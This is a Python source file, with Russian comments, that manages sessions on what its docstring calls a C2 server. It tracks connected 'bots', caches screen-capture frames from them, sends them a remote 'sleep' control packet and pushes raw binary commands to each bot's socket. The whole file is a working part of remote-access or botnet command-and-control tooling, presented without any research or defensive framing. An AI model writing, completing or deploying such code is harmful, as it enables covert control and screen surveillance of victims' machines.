# backend/Services/ClientManager.py

import asyncio
from typing import Any, Dict, List, Optional, Tuple

import backend.LoggerWrapper as logger
from .network import NetworkProtocol


active_clients: Dict[str, Any] = {} 
preview_cache: Dict[str, bytes] = {}

async def close_client_session(bot_identifier: str, send_termination_command: bool = True) -> bool:
    """
    Завершает сетевую сессию бота и освобождает ресурсы в оперативной памяти.
    """
    session_data: Optional[Tuple[asyncio.StreamReader, asyncio.StreamWriter]] = active_clients.pop(
        bot_identifier, 
        None
    )

    if not session_data:
        return False

    stream_reader, stream_writer = session_data

    try:
        if send_termination_command and not stream_writer.transport.is_closing():
            # Формируем пакет "усыпления" согласно стандарту V8.0
            # [RemoteControl:str:STOP:none] + "sleep"
            termination_packet: bytes = NetworkProtocol.pack_packet(
                bot_identifier,
                "RemoteControl",
                "str",
                "STOP",
                "none",
                "sleep"
            )
            stream_writer.write(termination_packet)
            await stream_writer.drain()
        
        if not stream_writer.transport.is_closing():
            stream_writer.close()
            await asyncio.wait_for(stream_writer.wait_closed(), timeout=2.0)

    except Exception as runtime_error:
        logger.Log.debug(f"[ClientManager] Resource cleanup error for {bot_identifier}: {runtime_error}")
    finally:
        # Очистка кэша изображений для экономии RAM
        if bot_identifier in preview_cache:
            preview_cache.pop(bot_identifier, None)
            
        logger.Log.info(f"[ClientManager] Resources for {bot_identifier} have been released")
    
    return True


async def close_all_active_sessions() -> int:
    """
    Массовое отключение всех подключенных клиентов (используется при остановке C2 сервера).
    """
    if not active_clients:
        return 0

    all_bot_identifiers: List[str] = list(active_clients.keys())
    # Использование gather для конкурентного закрытия всех соединений
    disconnection_tasks = [close_client_session(bot_id) for bot_id in all_bot_identifiers]
    
    execution_results = await asyncio.gather(*disconnection_tasks)
    
    return len([status for status in execution_results if status is True])


def get_online_clients_list() -> List[Dict[str, str]]:
    """
    Формирует список идентификаторов всех ботов со статусом Online.
    """
    return [{"id": bot_id, "status": "online"} for bot_id in active_clients]


async def send_binary_packet_to_bot(bot_identifier: str, binary_data: bytes) -> bool:
    """
    Прямая передача сформированного бинарного пакета в сокет конкретного бота.
    """
    session_data: Optional[Tuple[asyncio.StreamReader, asyncio.StreamWriter]] = active_clients.get(
        bot_identifier
    )

    if not session_data:
        logger.Log.warning(f"[ClientManager] Failed to send data: Bot {bot_identifier} is offline")
        return False

    try:
        stream_writer: asyncio.StreamWriter = session_data[1]
        if not stream_writer.transport.is_closing():
            stream_writer.write(binary_data)
            await stream_writer.drain()
            return True
        return False
    except Exception as connection_error:
        logger.Log.error(f"[ClientManager] Transmission error to {bot_identifier}: {connection_error}")
        # При ошибке записи инициируем закрытие сессии без отправки команд
        asyncio.create_task(close_client_session(bot_identifier, send_termination_command=False))
        return False


def get_cached_preview_data(bot_identifier: str) -> Optional[bytes]:
    """
    Извлечение последнего кадра экрана из кэша предварительного просмотра.
    """
    return preview_cache.get(bot_identifier)